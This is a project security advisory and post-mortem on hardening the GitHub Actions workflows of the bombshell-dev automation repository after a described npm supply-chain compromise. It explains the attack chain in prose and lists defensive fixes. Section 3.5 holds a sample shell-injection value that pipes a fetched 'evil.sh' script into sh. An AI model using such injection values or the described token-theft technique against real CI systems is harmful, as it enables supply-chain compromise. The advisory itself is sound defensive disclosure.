# Security advisory: GitHub Actions hardening (2026-05-12)

On 2026-05-11, a supply-chain compromise hit `@tanstack/*` on npm. The chain that made it work — `pull_request_target` exposure, cache poisoning across the PR ↔ `main` trust boundary, and OIDC token theft from runner memory — applies to any project that uses GitHub Actions the way most of us do. Bombshell sits in that blast radius: we publish to npm, we run reusable workflows on behalf of every `bombshell-dev/*` repository, and one of those workflows holds `id-token: write` against the npm trusted-publisher relationship.

This document is the post-mortem and the work we did in response. It covers what happened upstream, the threat model we used to evaluate our own exposure, how Bombshell's CI is actually wired together, and the concrete changes we landed. It is scoped to [bombshell-dev/automation](https://github.com/bombshell-dev/automation) — the repository that hosts our reusable workflows.

## 1. The TanStack compromise (2026-05-11)

84 malicious npm versions across 42 `@tanstack/*` packages were published in roughly six minutes by chaining three independent vulnerabilities. Each one bridged a trust boundary the others assumed was intact; in isolation, none of them was sufficient.

1. **`pull_request_target` "Pwn Request."** TanStack's `bundle-size.yml` ran `actions/checkout` against `refs/pull/<n>/merge` inside a `pull_request_target` job. That meant fork-PR code executed with the trust level of the base repository — secrets in scope, write tokens available — instead of the locked-down `pull_request` trust level. A first-time contributor's PR could run arbitrary code as `main`.

2. **GitHub Actions cache poisoning across the PR ↔ `main` trust boundary.** `actions/cache@v5`'s implicit post-job save step is not gated by the workflow's `permissions:` block. PR runs share cache scope with `main` runs. Once the attacker had code execution in a fork PR (via vulnerability 1), they wrote a poisoned pnpm-store cache under the exact key `release.yml` would later restore on `main`.

3. **OIDC token extraction from runner memory.** `release.yml` declared `id-token: write` for npm trusted publishing. After the poisoned dependency landed on the runner (via vulnerability 2), attacker code walked `/proc/<runner-pid>/mem` to extract the OIDC token, then POSTed publishes directly to `registry.npmjs.org`. The technique is verbatim the memory-dump tradecraft from the March 2025 [`tj-actions/changed-files`](https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised) compromise.

### Further reading

- Adnan Khan, [_The Monsters in Your Build Cache: GitHub Actions Cache Poisoning_](https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/) (May 2024)
- GitHub Security Lab, [_Keeping your GitHub Actions and workflows secure: Preventing pwn requests_](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/)
- StepSecurity, [_Harden-Runner detection: `tj-actions/changed-files` action is compromised_](https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised) (March 2025)

## 2. How Bombshell CI is structured

The `automation` repository exposes ten reusable workflows under `.github/workflows/`. Other `bombshell-dev/*` repositories call them via `uses: bombshell-dev/automation/.github/workflows/<name>.yml@<ref>`. Knowing which workflow holds which capability is the prerequisite for understanding what changed.

| Workflow | Purpose | Required secrets | Sensitive permissions |
|---|---|---|---|
| `publish.yml` | Version + publish to npm via Changesets | `BOT_APP_ID`, `BOT_PRIVATE_KEY` | `contents: write`, `pull-requests: write`, `id-token: write` |
| `preview.yml` | Publish PR previews to pkg.pr.new | — | `contents: write`, `pull-requests: write`, `id-token: write` |
| `format.yml` | Auto-format and commit on PRs | `BOT_APP_ID`, `BOT_PRIVATE_KEY` | `contents: write`, `pull-requests: write` |
| `build.yml` | Build and commit generated output | `BOT_APP_ID`, `BOT_PRIVATE_KEY` | `contents: write` |
| `run.yml` | Matrix runner for `package.json` scripts | — | none |
| `detect-agent.yml` | Classify and label PRs from automated authors | — | `issues: write`, `pull-requests: write` |
| `detect-agent-backfill.yml` | Backfill `detect-agent` classification on existing PRs | — | `issues: write`, `pull-requests: write` |
| `add-issue-to-project.yml` | Add new issues to the org project board | `BOT_APP_ID`, `BOT_PRIVATE_KEY` | `repository-projects: write` |
| `move-issue-to-backlog.yml` | Move closed issues into the backlog column | `BOT_APP_ID`, `BOT_PRIVATE_KEY` | `repository-projects: write` |
| `mergebot.yml` | Post merge announcements to Discord | `DISCORD_WEBHOOK` | none |

`publish.yml` is the highest-value asset in this set. It is the only workflow with `id-token: write` whose token is bound to the npm trusted-publisher relationship for every package the org publishes. The TanStack attack ended at exactly this shape of token; everything in §3 is organized around making that token harder to reach.

## 3. Hardening changes

### 3.1 Default-deny workflow permissions

Every workflow file now declares `permissions: {}` at the top level, above `jobs:`. Job-level `permissions:` blocks continue to grant the specific scopes each job needs.

The default `GITHUB_TOKEN` permissions on a repository are not "none." Without a top-level deny, a workflow inherits the org/repo default — historically `read-all`, sometimes `write-all`. Forcing the default to empty means a future job that forgets its own `permissions:` block fails closed instead of silently inheriting write scopes.

### 3.2 SHA-pinning third-party actions

Every third-party action reference now uses a 40-character commit SHA with a trailing version comment, e.g.:

```yaml
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.2.2
```

Pinned: `actions/checkout`, `actions/setup-node`, `actions/cache/restore`, `actions/cache/save`, `actions/create-github-app-token`, `pnpm/action-setup`, `stefanzweifel/git-auto-commit-action`, `changesets/action`.

Tag references (`@v4`, `@main`) are mutable — a compromised or coerced maintainer can repoint a tag to a malicious commit and every consumer picks it up on the next run. SHA references are content-addressed.

A `.github/dependabot.yml` entry for the `github-actions` ecosystem now opens weekly PRs to bump those pins, so the hardening does not degrade into a "pinned and abandoned" state.

### 3.3 Splitting `publish.yml` into build and publish

`publish.yml` previously ran `pnpm install` → `pnpm run build` → `changesets publish` inside a single job that held `id-token: write`. The split now looks like:

```yaml
jobs:
  build:
    permissions:
      contents: read
    steps:
      - checkout
      - setup-node
      - pnpm install
      - pnpm run build
      - upload-artifact: dist/

  publish:
    needs: build
    permissions:
      contents: write
      id-token: write
    steps:
      - checkout
      - setup-node
      - download-artifact
      - changesets/action publish
```

The publish job never executes project code. It downloads the prebuilt artifact and invokes `changesets/action`, nothing else. The OIDC token is requested only inside a job that has no opportunity to run a poisoned `postinstall` script or a tampered build step. This is the direct defence against the vulnerability-3 leg of the TanStack chain.

### 3.4 Explicit secret pass-through

Every `secrets: inherit` was replaced with an explicit, per-workflow list. Callers now pass only the secrets each reusable workflow declares.

`secrets: inherit` makes the entire calling repo's secret store available to a reusable workflow regardless of what that workflow actually reads. If a reusable workflow is later compromised — or accidentally adds a new step that reads `secrets.NPM_TOKEN` — the inheriting caller has no warning. Explicit pass-through is a contract: the workflow declares what it needs; the caller decides what it is willing to provide.

### 3.5 Safer shell interpolation in `preview.yml`

`preview.yml` was interpolating workflow inputs directly into a shell command:

```yaml
# before
run: pnpx pkg-pr-new publish '${{ inputs.publish }}' --template '${{ inputs.template }}'
```

`${{ }}` expansion happens before the shell sees the line, so single-quoting in YAML does not contain a value that contains a single quote. A caller passing `'; curl evil.sh | sh; '` as `inputs.publish` would execute arbitrary commands on the runner. The values now flow through `env:`:

```yaml
# after
env:
  PUBLISH_GLOB: ${{ inputs.publish }}
  TEMPLATE_GLOB: ${{ inputs.template }}
run: pnpx pkg-pr-new publish "$PUBLISH_GLOB" --template "$TEMPLATE_GLOB"
```

The same pattern was applied to every other `run:` block that interpolated `${{ github.event.* }}`, `${{ steps.*.outputs.* }}` derived from PR input, or `${{ inputs.* }}` directly into shell.

### 3.6 Repository-owner gate on `detect-agent.yml`

`detect-agent.yml` is now guarded with `if: github.repository_owner == 'bombshell-dev'`, matching the gate that already existed on `publish.yml`, `preview.yml`, `format.yml`, and `build.yml`. Forks that copy the workflow accidentally — or maliciously — will no-op instead of running our scanner under the fork's trust level.

### 3.7 Audit of `pull_request_target` usage

We confirmed that no workflow in `automation` uses `pull_request_target`. The TanStack-style "Pwn Request" — checking out PR head code inside a `pull_request_target` job — is not currently possible in this repository. The check is now part of the review heuristic for new workflows.

## 4. Defense-in-depth (next)

These are tracked as follow-ups, not yet landed. This section exists so the public record is clear about what we view as in-scope but not yet done.

- **Harden-Runner egress monitoring.** Add [`step-security/harden-runner`](https://github.com/step-security/harden-runner) in `audit` mode to every job that runs project code. Graduate to `block` mode per-workflow once we have an egress allowlist with low enough false-positive rate to keep CI unblocked.
- **Commit signing on bot-authored commits.** The Bombshell GitHub App commits via `actions/create-github-app-token` + the GitHub REST API, which signs commits with the app's key by default. Audit that every `git-auto-commit-action` invocation routes through that path rather than a raw `git push`.
- **Cache scoping review.** Where we use `actions/cache`, confirm that no key restored by a privileged workflow can also be written by a PR-trust-level workflow. This is the vulnerability-2 leg of the TanStack chain.

## 5. Out of scope

- **Runner image hardening.** We use GitHub-hosted runners; runner-image security is GitHub's responsibility.
- **npm scope maintainer reduction.** Reducing the number of accounts with publish rights on the `@bombshell` and related scopes is an org-level decision and is being handled separately from CI hardening.
- **Replacing OIDC trusted publishing with classic-token + environment approval.** Trusted publishing has real ergonomic and auditability benefits; whether the runner-memory token-extraction risk outweighs those benefits is an open organisational discussion, not a unilateral CI choice.
- **Egress allowlist construction.** Per-workflow; the methodology is to start in `harden-runner` audit mode, collect a week of legitimate egress, then promote to block mode. Constructing the allowlists themselves is operational follow-up, not an artefact of this advisory.
